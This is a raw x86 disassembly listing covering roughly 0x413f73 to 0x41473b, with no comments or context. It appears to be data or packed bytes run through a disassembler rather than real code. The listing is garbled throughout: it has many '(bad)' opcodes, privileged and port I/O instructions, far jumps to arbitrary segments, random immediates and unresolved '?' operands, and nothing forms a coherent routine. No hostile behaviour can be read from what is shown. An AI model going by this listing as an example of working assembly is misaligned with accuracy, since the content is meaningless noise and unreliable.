  413f73:	and    dl,dl
  413f75:	lahf   
  413f76:	lds    esp,FWORD PTR [edi-0x6f]
  413f79:	inc    eax
  413f7a:	mov    esi,0xf14d720e
  413f7f:	lods   al,BYTE PTR ds:[esi]
  413f80:	cmp    eax,edi
  413f82:	sbb    al,0x1e
  413f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f85:	imul   edx,DWORD PTR [esp+esi*8+0x56c945a5],0x2d
  413f8d:	sbb    eax,0x36e8afd7
  413f92:	les    edi,FWORD PTR [edi]
  413f94:	jne    0x413fa0
  413f96:	add    eax,0xe1b99419
  413f9b:	ds and dh,0x36
  413f9f:	aad    0xfc
  413fa1:	add    edx,ebx
  413fa3:	(bad)  
  413fa4:	push   edi
  413fa5:	mov    bl,0xa
  413fa7:	xor    al,0x9b
  413fa9:	inc    ecx
  413faa:	dec    eax
  413fab:	xor    bl,BYTE PTR [edx]
  413fad:	ficomp WORD PTR [ecx+0x91a89f0]
  413fb3:	mov    esi,0x4f177168
  413fb8:	cmp    BYTE PTR [edx+0xb],bh
  413fbb:	push   eax
  413fbc:	lods   al,BYTE PTR fs:[esi]
  413fbe:	xor    eax,0x20e9d235
  413fc3:	xor    BYTE PTR ds:0xc8c450c3,ch
  413fca:	std    
  413fcb:	inc    esp
  413fcc:	and    edx,ebx
  413fce:	or     eax,0x83118eae
  413fd3:	add    al,0x43
  413fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fd6:	push   edi
  413fd7:	push   ebp
  413fd8:	rcr    DWORD PTR ds:0x8200a3ca,0x6a
  413fdf:	push   esi
  413fe0:	pushf  
  413fe1:	call   0x69a6f1c3
  413fe6:	stos   BYTE PTR es:[edi],al
  413fe7:	ja     0x414039
  413fe9:	adc    eax,0xb3057f45
  413fee:	repnz pop ebx
  413ff0:	inc    ebx
  413ff1:	shr    DWORD PTR [ebx],cl
  413ff3:	fcmovne st,st(2)
  413ff5:	cmp    DWORD PTR [esi-0xec33243],ebx
  413ffb:	xor    DWORD PTR [edx],ebx
  413ffd:	mov    cl,0xf7
  413fff:	fwait
  414000:	push   0xf48fdf6d
  414005:	pop    eax
  414006:	ins    DWORD PTR es:[edi],dx
  414007:	inc    ebp
  414008:	add    BYTE PTR ds:0x4862109b,al
  41400e:	(bad)  
  41400f:	mov    edi,0xdb48330e
  414014:	dec    ebp
  414015:	sbb    BYTE PTR [eax+0x50781dc8],ch
  41401b:	mov    edi,0xd97087f2
  414020:	and    al,0x6e
  414022:	dec    ebx
  414023:	(bad)  
  414024:	adc    al,0x23
  414026:	rcl    BYTE PTR [ebx+edi*1-0x19c85b57],0xe2
  41402e:	jg     0x414021
  414030:	or     DWORD PTR [ebp+0x5735395],ecx
  414036:	adc    eax,0x560d62b
  41403b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41403c:	leave  
  41403d:	mov    dh,0x41
  41403f:	and    DWORD PTR [eax],0x1ab350b
  414045:	cmc    
  414046:	add    eax,0x1fdf365e
  41404b:	cmp    eax,0xe0cf0d03
  414050:	pop    esi
  414051:	sbb    eax,0x51e13a22
  414056:	mov    ecx,0x555f03a1
  41405b:	in     eax,dx
  41405c:	mov    ebp,0xbe41820a
  414061:	lea    eax,[edx]
  414063:	repnz mov WORD PTR [edi+ebx*4+0x1fad7fc5],?
  41406b:	xchg   ebx,eax
  41406c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41406d:	pop    ecx
  41406e:	jmp    0xfea3d3f2
  414073:	iret   
  414074:	sbb    DWORD PTR [ebp+eiz*1+0x23],esi
  414078:	sub    BYTE PTR ds:0x26997eeb,0x71
  41407f:	icebp  
  414080:	or     eax,0xa4dc0f80
  414085:	sub    al,0xd
  414087:	xchg   DWORD PTR [ecx+esi*1+0x18],ebp
  41408b:	xchg   esi,eax
  41408c:	sti    
  41408d:	lea    esp,[esi-0x7e]
  414090:	fld    DWORD PTR [ebp+0x6]
  414093:	dec    edi
  414095:	les    ebp,FWORD PTR [edi+0x57]
  414098:	clc    
  414099:	inc    ecx
  41409a:	sub    ecx,DWORD PTR [ebp-0x7b54f232]
  4140a0:	xchg   edi,eax
  4140a1:	stos   BYTE PTR es:[edi],al
  4140a2:	xchg   esp,eax
  4140a3:	adc    ebp,DWORD PTR [edi+0x1331d5bc]
  4140a9:	mov    BYTE PTR [ecx-0x37],al
  4140ac:	scas   eax,DWORD PTR es:[edi]
  4140ad:	xchg   ebx,eax
  4140ae:	xchg   esi,eax
  4140af:	pop    ss
  4140b0:	mov    eax,esi
  4140b2:	fs int 0x39
  4140b5:	mov    esp,0xfcdcc219
  4140ba:	push   esp
  4140bb:	jmp    0x4140ec
  4140bd:	mov    WORD PTR [ecx-0x3bd8c790],cs
  4140c3:	mov    BYTE PTR [edx],dl
  4140c5:	cwde   
  4140c6:	inc    ecx
  4140c7:	fldenv [eax-0x17]
  4140ca:	cmc    
  4140cb:	test   al,0x96
  4140cd:	dec    edi
  4140ce:	(bad)  
  4140cf:	retf   0xa82a
  4140d2:	lock ror BYTE PTR [ebx-0x2f],1
  4140d6:	push   0x51429682
  4140db:	shl    DWORD PTR ds:0xea48437d,1
  4140e1:	(bad)  
  4140e2:	nop
  4140e3:	call   0x109b:0x9c3e0025
  4140ea:	jnp    0x414136
  4140ec:	mov    ah,0x86
  4140ee:	jg     0x41408f
  4140f0:	jns    0x414127
  4140f2:	rol    BYTE PTR [ecx+0x5f5af943],0x6c
  4140f9:	lock inc esp
  4140fb:	xchg   ebx,eax
  4140fc:	das    
  4140fd:	push   esi
  4140fe:	push   es
  4140ff:	jnp    0x4140ae
  414101:	lds    edx,FWORD PTR [esi+0x6d9ac2cd]
  414107:	adc    DWORD PTR [esi-0x8],ebp
  41410a:	xor    esp,DWORD PTR [ebx-0xec6bbb9]
  414110:	int3   
  414111:	and    al,0xd0
  414113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414114:	jle    0x4140fa
  414116:	shl    edi,cl
  414118:	call   0xce11:0xf80ec136
  41411f:	dec    eax
  414120:	loop   0x4140f9
  414122:	xchg   esi,eax
  414124:	stc    
  414125:	je     0x4140d5
  414127:	sub    BYTE PTR [edx+0x3d],cl
  41412a:	bound  edx,QWORD PTR [ecx-0x7eebd28c]
  414130:	pop    edx
  414131:	and    eax,0xfd685761
  414136:	push   esi
  414137:	sbb    esp,eax
  414139:	add    eax,0x2eba4e11
  41413e:	inc    ebx
  41413f:	aad    0x81
  414141:	clc    
  414142:	adc    BYTE PTR [ebx],bh
  414144:	jecxz  0x41419f
  414146:	dec    ebp
  414147:	retf   0xf76b
  41414a:	xchg   BYTE PTR [edx+0x7d],dl
  41414d:	cmp    al,0x8b
  41414f:	pop    ebx
  414150:	outs   dx,DWORD PTR ds:[esi]
  414151:	jno    0x41414e
  414153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414154:	mov    ah,0x8b
  414156:	sbb    al,0xe1
  414158:	mov    ebp,0x38da38d
  41415d:	ins    BYTE PTR es:[edi],dx
  41415e:	fcomip st,st(0)
  414160:	call   0xf8659f15
  414165:	ret    
  414166:	aaa    
  414167:	or     BYTE PTR [esi-0x6b],cl
  41416a:	or     BYTE PTR [eax-0x2dca09b5],ch
  414170:	add    edi,edi
  414172:	or     ah,cl
  414174:	imul   esp,DWORD PTR [edi],0x5b
  414177:	inc    esi
  414178:	lahf   
  414179:	xchg   esi,eax
  41417a:	push   ebp
  41417b:	xchg   BYTE PTR [ebx+0x18],dh
  41417e:	rol    ah,0xb8
  414181:	ret    
  414182:	pushf  
  414183:	pop    ds
  414184:	jbe    0x41413c
  414186:	mov    ds:0x755b0f66,eax
  41418b:	mov    bl,0x30
  41418d:	add    edx,0xffffffdc
  414190:	or     eax,0x3ed11f23
  414195:	enter  0x735,0x5d
  414199:	adc    edi,esp
  41419b:	dec    ebp
  41419c:	retf   
  41419d:	or     al,0x96
  41419f:	jge    0x414202
  4141a1:	mov    ecx,0x4335f51e
  4141a6:	mov    ch,0x36
  4141a8:	xor    DWORD PTR es:[edi*2+0x6eb835f5],ecx
  4141b0:	(bad)  
  4141b1:	outs   dx,BYTE PTR ds:[esi]
  4141b2:	hlt    
  4141b3:	fcom   QWORD PTR [ebx-0x3e43671f]
  4141b9:	es push esi
  4141bb:	inc    esp
  4141bc:	sbb    cl,BYTE PTR [eax-0x581b7bd2]
  4141c2:	jbe    0x414242
  4141c4:	dec    eax
  4141c5:	inc    ecx
  4141c6:	xor    al,0x99
  4141c8:	js     0x41420b
  4141ca:	inc    eax
  4141cb:	shr    BYTE PTR [edx],cl
  4141cd:	xchg   ebx,eax
  4141ce:	dec    edi
  4141cf:	ret    0xcdda
  4141d2:	dec    eax
  4141d3:	mov    ebp,0xc2495d27
  4141d8:	fucomp st(5)
  4141da:	inc    ebx
  4141db:	adc    DWORD PTR [ebx+0x28],esi
  4141de:	pop    esp
  4141df:	jb     0x41422b
  4141e1:	dec    ebx
  4141e2:	repz jg 0x41417b
  4141e5:	push   es
  4141e6:	clc    
  4141e7:	inc    edi
  4141e8:	loop   0x41416f
  4141ea:	inc    ebx
  4141eb:	mov    ds:0xc839d479,eax
  4141f0:	jl     0x4141ba
  4141f2:	mov    ds:0x1e2e371a,eax
  4141f7:	ror    ch,0x10
  4141fa:	call   0xd6e12bbb
  4141ff:	stos   DWORD PTR es:[edi],eax
  414200:	xor    edx,DWORD PTR [ebx-0xc]
  414203:	scas   al,BYTE PTR es:[edi]
  414204:	push   esp
  414205:	add    eax,0x84034d53
  41420a:	neg    DWORD PTR [ebp+0x67f3ec26]
  414210:	leave  
  414211:	push   edx
  414212:	push   ebx
  414213:	adc    al,0x60
  414215:	lds    edx,FWORD PTR [edx]
  414217:	mov    ?,WORD PTR [edx+0x58]
  41421a:	pusha  
  41421b:	mov    edi,0x6049c747
  414220:	mov    bh,0xe5
  414222:	xor    edx,esi
  414224:	iret   
  414225:	sub    esp,DWORD PTR [edx]
  414227:	pop    edi
  414228:	cmc    
  414229:	retf   0x1667
  41422c:	int    0x82
  41422e:	fcomi  st,st(1)
  414230:	clc    
  414231:	mov    edi,0x1e06819e
  414236:	mov    ah,0x76
  414238:	fmul   st,st(3)
  41423a:	inc    esi
  41423b:	jl     0x41424b
  41423d:	push   ecx
  41423e:	add    cl,BYTE PTR [ecx-0x77]
  414241:	push   ecx
  414242:	jecxz  0x4142a7
  414244:	popa   
  414245:	xchg   esi,eax
  414246:	xor    ebp,ecx
  414248:	pusha  
  414249:	push   0x32
  41424b:	or     al,0xe3
  41424d:	jne    0x41426f
  41424f:	or     esp,DWORD PTR [eax]
  414251:	mov    esi,esi
  414253:	cmp    esi,DWORD PTR [eax+0x75199f23]
  414259:	or     BYTE PTR [ecx+eax*4-0x335f13c3],0xf7
  414261:	pushf  
  414262:	test   DWORD PTR [ebx],edi
  414264:	or     BYTE PTR [edx+0x23],dl
  414267:	mov    ebp,0x12ad4ede
  41426c:	iret   
  41426d:	inc    ecx
  41426e:	push   edx
  41426f:	or     eax,0xb1bfcc61
  414274:	int3   
  414275:	test   eax,0x197ba5c6
  41427a:	push   ecx
  41427b:	loope  0x414200
  41427d:	arpl   dx,di
  41427f:	in     eax,dx
  414280:	in     eax,dx
  414281:	and    DWORD PTR [ebx+0x4b88c6a8],esp
  414287:	leave  
  414288:	or     dh,bl
  41428a:	ret    
  41428b:	addr16 cmp esp,eax
  41428e:	push   esi
  41428f:	icebp  
  414290:	sahf   
  414291:	cmc    
  414292:	mov    dh,0x3b
  414294:	(bad)  
  414296:	ret    0xd44
  414299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41429a:	out    0x18,al
  41429c:	scas   eax,DWORD PTR es:[edi]
  41429d:	fbld   TBYTE PTR fs:[eax+edx*1]
  4142a1:	scas   al,BYTE PTR es:[edi]
  4142a2:	mov    ch,0xde
  4142a4:	sub    BYTE PTR [ebx+0x13996107],0xf0
  4142ab:	aas    
  4142ac:	adc    ch,BYTE PTR [edi+0x6f]
  4142af:	push   0xffffff83
  4142b1:	fimul  DWORD PTR [ebp-0x23b2c67a]
  4142b7:	test   DWORD PTR [esi],0xc13b93ea
  4142bd:	int3   
  4142be:	in     eax,0xed
  4142c0:	mov    ds:0xbd8ffa4c,eax
  4142c5:	outs   dx,BYTE PTR ds:[esi]
  4142c6:	adc    dh,BYTE PTR [esi-0x59]
  4142c9:	cwde   
  4142ca:	mov    ah,0xdc
  4142cc:	push   esp
  4142ce:	scas   al,BYTE PTR es:[edi]
  4142cf:	loope  0x4142fd
  4142d1:	repnz xchg ecx,eax
  4142d3:	das    
  4142d4:	xchg   ecx,eax
  4142d5:	js     0x41425f
  4142d7:	or     ebp,eax
  4142d9:	stc    
  4142da:	jl     0x414325
  4142dc:	xchg   ebp,eax
  4142dd:	jb     0x4142a3
  4142df:	pop    ecx
  4142e0:	popa   
  4142e1:	aaa    
  4142e2:	pop    ebp
  4142e3:	push   edx
  4142e4:	push   ss
  4142e5:	push   esi
  4142e6:	fs scas eax,DWORD PTR es:[edi]
  4142e8:	push   esi
  4142e9:	dec    ecx
  4142ea:	lods   al,BYTE PTR ds:[esi]
  4142eb:	sub    al,0x83
  4142ed:	jmp    0x414347
  4142ef:	ds xchg ebp,eax
  4142f1:	xor    cl,BYTE PTR [edx+eax*8+0x11a7c8]
  4142f8:	pop    esi
  4142f9:	jae    0x4142da
  4142fb:	push   ebx
  4142fc:	push   es
  4142fd:	or     al,0x60
  4142ff:	or     BYTE PTR [eax],bl
  414301:	ret    0x772c
  414304:	mov    eax,esp
  414306:	sbb    dl,BYTE PTR [edi-0x5c]
  414309:	and    bh,dh
  41430b:	mov    ds:0x6a811456,al
  414310:	sahf   
  414311:	scas   eax,DWORD PTR es:[edi]
  414312:	retf   0x89a2
  414315:	dec    ebx
  414316:	pop    eax
  414317:	mov    ch,0xb7
  414319:	je     0x41434f
  41431b:	(bad)  
  41431c:	cmp    esp,DWORD PTR [edi-0x36c2cbf5]
  414322:	ins    BYTE PTR es:[edi],dx
  414323:	test   DWORD PTR [edx+0x4f],0x28c878d5
  41432a:	in     al,0x85
  41432c:	out    dx,eax
  41432d:	mov    ax,0x2e5d
  414331:	inc    esp
  414332:	push   ecx
  414333:	dec    edx
  414334:	rcr    BYTE PTR [ebx+edx*8],cl
  414337:	sbb    eax,0x164e10ee
  41433c:	ret    
  41433d:	ja     0x414338
  41433f:	rcr    BYTE PTR [edi],cl
  414341:	xchg   DWORD PTR [edi-0x37ecf24d],ebp
  414347:	mov    al,ds:0x66a5fb4d
  41434c:	xchg   edx,eax
  41434d:	sbb    esi,DWORD PTR [esi-0x1e9f5c90]
  414353:	bound  ecx,QWORD PTR [ecx-0x3e2bffe1]
  414359:	mov    al,0xe0
  41435b:	cmp    DWORD PTR [edx-0x15],ebp
  41435e:	out    dx,eax
  41435f:	cmp    al,0xac
  414361:	adc    bh,cl
  414363:	or     eax,0x5e9c3517
  414369:	enter  0xd58,0xa
  41436d:	mov    eax,ds:0xcccded34
  414372:	inc    ecx
  414373:	aad    0x24
  414375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414376:	js     0x414346
  414378:	xchg   esp,eax
  414379:	mov    dl,dl
  41437b:	push   ss
  41437c:	rcr    DWORD PTR [eax-0x20f79d84],0xcc
  414383:	je     0x4143de
  414385:	js     0x414390
  414387:	sar    DWORD PTR [ebx-0x55],0xdd
  41438b:	pop    ecx
  41438c:	arpl   sp,cx
  41438e:	jbe    0x414322
  414390:	dec    ebp
  414391:	push   esp
  414392:	inc    edi
  414393:	fistp  QWORD PTR [esi]
  414395:	mov    bh,0x49
  414397:	aaa    
  414398:	pop    ebp
  414399:	ficom  DWORD PTR [edx-0x32257155]
  41439f:	pop    edi
  4143a0:	ret    
  4143a1:	or     al,0x8f
  4143a3:	or     edi,DWORD PTR [esi]
  4143a5:	ret    
  4143a6:	mov    edi,0x33fd9ec0
  4143ab:	xchg   ebx,eax
  4143ac:	cmp    al,bh
  4143ae:	jo     0x41437b
  4143b0:	sti    
  4143b1:	test   BYTE PTR [edi+0x18dddcb0],0xf
  4143b8:	adc    eax,0x76b12014
  4143bd:	repz push esi
  4143bf:	push   edi
  4143c0:	sar    DWORD PTR [edi],cl
  4143c2:	jb     0x41435a
  4143c4:	xchg   BYTE PTR [esi],bl
  4143c6:	call   0x7cfb:0x2bf7d1c6
  4143cd:	pop    edi
  4143ce:	xchg   ebx,eax
  4143cf:	push   esi
  4143d0:	sti    
  4143d1:	xor    al,0x80
  4143d3:	push   ss
  4143d4:	test   eax,0x9fa020d8
  4143d9:	(bad)  
  4143da:	iret   
  4143db:	mov    al,ds:0x95f1eb62
  4143e0:	out    dx,al
  4143e1:	xor    al,0xf6
  4143e3:	push   ebx
  4143e4:	adc    edx,esi
  4143e6:	hlt    
  4143e7:	aam    0x0
  4143e9:	inc    edx
  4143ea:	test   BYTE PTR [esi+0x7f0b3176],bl
  4143f0:	icebp  
  4143f1:	shl    DWORD PTR [ebx],cl
  4143f3:	hlt    
  4143f4:	inc    edx
  4143f5:	int    0x64
  4143f7:	mov    bh,0x97
  4143f9:	int3   
  4143fa:	adc    ch,al
  4143fc:	cmp    al,0x13
  4143fe:	in     eax,0x39
  414400:	and    dh,BYTE PTR [edi-0x7d]
  414403:	outs   dx,DWORD PTR ds:[esi]
  414404:	jno    0x414422
  414406:	mov    ds:0x5969f4fb,eax
  41440b:	sub    ah,BYTE PTR [edx]
  41440d:	dec    esi
  41440e:	(bad)  
  41440f:	scas   eax,DWORD PTR es:[edi]
  414410:	push   cs
  414411:	jnp    0x414417
  414413:	dec    ebp
  414414:	or     DWORD PTR [edi-0xf],edx
  414417:	lods   al,BYTE PTR ds:[esi]
  414418:	push   es
  414419:	in     eax,0x1b
  41441b:	add    dl,BYTE PTR [ebp+0x3d]
  41441e:	mov    cl,0x54
  414420:	xor    ebp,ebp
  414422:	pop    edx
  414423:	push   eax
  414424:	mov    bl,bh
  414426:	retf   
  414427:	in     eax,0x8a
  414429:	inc    BYTE PTR [edi-0x69]
  41442c:	mov    edi,0x4ab4861c
  414431:	popa   
  414432:	cli    
  414433:	and    BYTE PTR [ebx+0x7f81696d],dl
  414439:	cmp    al,0x60
  41443b:	in     eax,0x64
  41443d:	inc    DWORD PTR fs:[esi-0xb]
  414441:	ins    BYTE PTR es:[edi],dx
  414442:	jno    0x414430
  414444:	loop   0x414440
  414446:	jmp    0x414425
  414448:	push   edi
  414449:	int3   
  41444a:	pop    esi
  41444b:	shl    bl,1
  41444d:	call   0xa5a1c705
  414452:	dec    esi
  414453:	inc    edx
  414454:	jmp    0x72327f0
  414459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41445a:	jns    0x4144b7
  41445c:	aas    
  41445d:	adc    DWORD PTR [esi-0x11],esp
  414460:	cmp    al,0x3a
  414462:	rcl    BYTE PTR [esi],1
  414464:	xor    bh,cl
  414466:	sub    DWORD PTR [ebx],0xffffff8e
  414469:	call   0xe6b0:0x3c59e7c6
  414470:	stos   BYTE PTR es:[edi],al
  414471:	aas    
  414472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414473:	mov    gs,WORD PTR [edx-0x6d]
  414476:	jge    0x41445f
  414478:	mov    ecx,0x6c88d664
  41447d:	mov    BYTE PTR [edi],dl
  41447f:	mov    al,ds:0x6b76fd5b
  414484:	mov    ch,0x18
  414486:	cmc    
  414487:	fs add bl,dl
  41448a:	adc    eax,DWORD PTR [ebx+ecx*1]
  41448d:	or     bl,0x7
  414490:	emms   
  414492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414493:	push   ebp
  414494:	sbb    DWORD PTR [ebx+0x3],eax
  414497:	mov    bl,0x21
  414499:	bound  esp,QWORD PTR [eax*8+0x64f11f13]
  4144a0:	adc    al,0x15
  4144a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144a4:	ret    
  4144a5:	dec    esp
  4144a6:	loop   0x41451f
  4144a8:	cwde   
  4144a9:	or     WORD PTR [ecx],0x489e
  4144ae:	fnstcw WORD PTR [edi+0x581857cf]
  4144b4:	xor    BYTE PTR [edx+0x2d],ch
  4144b7:	xor    ebx,DWORD PTR [eax+0x628f3897]
  4144bd:	jmp    0x4144da
  4144bf:	icebp  
  4144c0:	(bad)
  4144c3:	mov    ah,0xa1
  4144c5:	xchg   DWORD PTR [ecx+0x7f758d54],eax
  4144cb:	iret   
  4144cc:	xchg   ebx,eax
  4144cd:	mov    ebp,0xbdeea81e
  4144d2:	retf   0x32de
  4144d5:	imul   edi,DWORD PTR [edx+0x4e815b5b],0x2e8ff051
  4144df:	mov    dl,0xb8
  4144e1:	ss mov bh,0x45
  4144e4:	add    dh,bh
  4144e6:	mov    ch,0xc3
  4144e8:	adc    BYTE PTR [ebx],ch
  4144ea:	xchg   ebx,eax
  4144eb:	xor    esi,DWORD PTR [edx-0x54b2d508]
  4144f1:	nop
  4144f2:	cmp    dh,dh
  4144f4:	inc    esp
  4144f5:	retf   
  4144f6:	and    al,0x26
  4144f8:	lahf   
  4144f9:	inc    edi
  4144fa:	dec    edi
  4144fb:	shr    DWORD PTR [edx],1
  4144fd:	push   es
  4144fe:	pushf  
  4144ff:	dec    ebx
  414500:	hlt    
  414501:	lock push ecx
  414503:	daa    
  414504:	push   esp
  414505:	and    edx,DWORD PTR [esi+eax*8-0x23519d2b]
  41450c:	cmc    
  41450d:	lods   eax,DWORD PTR ds:[esi]
  41450e:	xor    eax,0xc26850fc
  414513:	scas   al,BYTE PTR es:[edi]
  414514:	jae    0x4144dd
  414516:	loop   0x4144e2
  414518:	jl     0x414566
  41451a:	jl     0x414554
  41451c:	fidiv  DWORD PTR [ebx]
  41451e:	icebp  
  41451f:	push   esi
  414520:	add    DWORD PTR [ebx],esi
  414522:	xchg   edx,eax
  414523:	ror    BYTE PTR [ebx+ebx*8+0x4ba68b75],1
  41452a:	adc    esi,ebx
  41452c:	mov    WORD PTR [ebx],ss
  41452e:	mov    dh,0xfd
  414530:	mov    al,0x77
  414532:	fcmovne st,st(3)
  414534:	mov    dl,0x27
  414536:	mov    eax,ds:0x8c6511d3
  41453b:	push   esi
  41453c:	daa    
  41453d:	fnstenv [esi+ecx*2]
  414540:	mov    ecx,0xdf0e5b7f
  414545:	out    dx,al
  414546:	pop    edx
  414547:	das    
  414548:	jo     0x414562
  41454a:	outs   dx,DWORD PTR ds:[esi]
  41454b:	ins    DWORD PTR es:[edi],dx
  41454c:	mov    eax,ds:0x9edec02d
  414551:	push   ebx
  414552:	pop    eax
  414553:	in     al,0xaf
  414555:	push   ebx
  414556:	(bad)  
  414557:	push   edi
  414558:	bswap  ebx
  41455a:	shl    BYTE PTR [di-0x1bd7],1
  41455f:	pop    eax
  414560:	pop    eax
  414561:	xchg   ebp,eax
  414562:	jmp    0x64e2:0xc8933671
  414569:	in     eax,dx
  41456a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41456b:	push   esi
  41456c:	leave  
  41456d:	mov    ah,0x9
  41456f:	or     al,0xbe
  414571:	pop    ebp
  414572:	popa   
  414573:	sub    DWORD PTR [ecx],eax
  414575:	fxch   st(0)
  414577:	adc    dh,BYTE PTR [ebx+ecx*4-0x59]
  41457b:	push   esi
  41457c:	addr16 push esp
  41457e:	int3   
  41457f:	inc    edi
  414580:	xlat   BYTE PTR ds:[ebx]
  414581:	add    DWORD PTR ds:0xf64b6d99,edx
  414587:	imul   ebp,DWORD PTR [edx-0x61],0xc893449e
  41458e:	sub    BYTE PTR [ebx+eiz*8-0x2],dl
  414592:	cmc    
  414593:	ss fwait
  414595:	push   ds
  414596:	lods   eax,DWORD PTR ds:[esi]
  414597:	scas   al,BYTE PTR es:[edi]
  414598:	pop    esi
  414599:	pusha  
  41459a:	sahf   
  41459b:	ficom  DWORD PTR [ebx]
  41459d:	push   ebx
  41459e:	icebp  
  41459f:	sar    DWORD PTR [edi-0x7c],cl
  4145a2:	nop
  4145a3:	xor    al,0xee
  4145a5:	add    DWORD PTR [ecx],edx
  4145a7:	sub    DWORD PTR [edi+0x6a3318d0],eax
  4145ad:	ror    BYTE PTR [ebx+ebx*1+0x6a],0x5e
  4145b2:	mov    eax,DWORD PTR [esi]
  4145b4:	xchg   edx,eax
  4145b5:	mov    edx,0x29ee230b
  4145ba:	scas   al,BYTE PTR es:[edi]
  4145bb:	lds    eax,FWORD PTR [edi+0x59863baf]
  4145c1:	in     eax,0x3b
  4145c3:	jae    0x41457c
  4145c5:	ret    0x813
  4145c8:	sbb    al,0x3a
  4145ca:	dec    ebx
  4145cb:	add    BYTE PTR [edi],ah
  4145cd:	inc    esi
  4145ce:	mov    al,0xe
  4145d0:	mov    BYTE PTR ds:0xed417ec,0xff
  4145d7:	xchg   ecx,eax
  4145d8:	mov    esp,0xc5e65a1c
  4145dd:	in     eax,0x6f
  4145df:	das    
  4145e0:	sbb    DWORD PTR [eax],esi
  4145e2:	imul   edx,DWORD PTR [ebx+0x13],0x48f2c5bc
  4145e9:	cmp    al,0x9d
  4145eb:	scas   al,BYTE PTR es:[edi]
  4145ec:	pusha  
  4145ed:	sub    BYTE PTR [ebp+0x4017512f],bh
  4145f3:	(bad)  
  4145f5:	dec    eax
  4145f6:	nop    DWORD PTR [ecx]
  4145f9:	pop    ecx
  4145fa:	push   eax
  4145fb:	test   al,0xe9
  4145fd:	xchg   ecx,eax
  4145fe:	fs push ebx
  414600:	mov    ebp,0x54c52e9a
  414605:	int    0xbd
  414607:	scas   al,BYTE PTR es:[edi]
  414608:	jnp    0x41459b
  41460a:	cmp    ch,BYTE PTR ds:0x65e47ec3
  414610:	imul   ebx,ecx,0x7f
  414613:	adc    al,0x61
  414615:	fwait
  414616:	stc    
  414617:	dec    ebx
  414618:	jmp    0x92a8:0x77314263
  41461f:	mov    eax,ds:0xc2f0536e
  414624:	xlat   BYTE PTR ds:[ebx]
  414625:	fdivr  QWORD PTR [edx+0x44fe384]
  41462b:	xor    BYTE PTR [eax+ecx*1-0x13d729b3],0x38
  414633:	bound  edi,QWORD PTR [ebx+0x10]
  414636:	and    bl,0xa1
  414639:	jle    0x4146a8
  41463b:	rcr    ebp,0x72
  41463e:	out    dx,eax
  41463f:	mov    dh,0xe5
  414641:	(bad)  
  414642:	mov    ebx,0x975a278f
  414647:	data16 xor dl,BYTE PTR [ebp+0x572a8b36]
  41464e:	(bad)  
  41464f:	test   BYTE PTR [eax+ebp*8-0x3c],0xf1
  414654:	enter  0x8e24,0xa0
  414658:	sbb    BYTE PTR es:[ebx-0x6d],dh
  41465c:	mov    esi,0x2ad4838a
  414661:	mov    eax,ds:0x7240cb71
  414666:	ficom  DWORD PTR [esi+0x6b]
  414669:	mov    cl,0xd2
  41466b:	dec    ebx
  41466c:	xchg   ebp,eax
  41466d:	jmp    ebx
  41466f:	sti    
  414670:	lahf   
  414671:	sub    DWORD PTR [esp+edi*1+0x60abaf12],0x58
  414679:	iret   
  41467a:	call   0x2ef67d7a
  41467f:	jmp    0x4146d3
  414681:	imul   eax,DWORD PTR [edx+0x58],0xffffffd7
  414685:	jge    0x41462a
  414687:	(bad)  
  414689:	imul   esi,DWORD PTR [esi],0xffffffb0
  41468c:	push   esi
  41468d:	and    edi,DWORD PTR [ecx+ebx*1-0x68fd40c]
  414694:	imul   esp,DWORD PTR [edi+eax*1-0x59],0xffffffee
  414699:	dec    esi
  41469a:	(bad)  
  41469b:	cwde   
  41469c:	iret   
  41469d:	add    al,0xa1
  41469f:	dec    eax
  4146a0:	adc    al,0x84
  4146a2:	cmp    BYTE PTR [ebx-0x720943ba],al
  4146a8:	add    DWORD PTR [ebp+0x44],0x1b
  4146ac:	(bad)  [ebx]
  4146ae:	inc    edi
  4146af:	jno    0x414694
  4146b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146b2:	fucomi st,st(3)
  4146b4:	mov    ebx,0x44a23792
  4146b9:	ret    0x89fd
  4146bc:	sbb    BYTE PTR [ecx+0x35],0x55
  4146c0:	ins    DWORD PTR es:[edi],dx
  4146c1:	add    BYTE PTR [ebp-0x4],bl
  4146c4:	add    eax,0xf38c49b
  4146c9:	jmp    0x8bc:0xc90eb41
  4146d0:	mov    al,ds:0xfd93f23
  4146d5:	mov    dh,BYTE PTR [eax-0x5d]
  4146d8:	lock jge 0x414686
  4146db:	and    DWORD PTR [ecx+0x382924b4],edx
  4146e1:	mov    ebx,0x26888f73
  4146e6:	sub    al,0x1
  4146e8:	lea    esi,[ebx+0x5e3ef7a]
  4146ee:	cmp    ebp,edx
  4146f0:	sub    cl,ah
  4146f2:	adc    BYTE PTR [eax-0x78a533e9],ch
  4146f8:	ins    BYTE PTR es:[edi],dx
  4146f9:	jmp    0xa72e:0xcf8cddb0
  414700:	popa   
  414701:	cmp    al,0xdb
  414703:	or     bl,BYTE PTR [ecx+0x6fa0b37e]
  414709:	xchg   BYTE PTR [esi+0x44fda4f2],ch
  41470f:	int    0x96
  414711:	add    BYTE PTR [esi-0x137bbd7c],bl
  414717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414718:	repz pop es
  41471a:	add    bh,bl
  41471c:	inc    ecx
  41471d:	out    dx,eax
  41471e:	push   ecx
  41471f:	repnz add ebx,esi
  414722:	popa   
  414723:	jecxz  0x414788
  414725:	xchg   ebp,eax
  414726:	push   0x407aa9d6
  41472b:	ja     0x41473a
  41472d:	daa    
  41472e:	in     eax,0xa7
  414730:	rol    DWORD PTR [esi],1
  414732:	int3   
  414733:	int3   
  414734:	lea    esi,ds:0xa267f5a3
  41473a:	push   ss
  41473b:	cli    
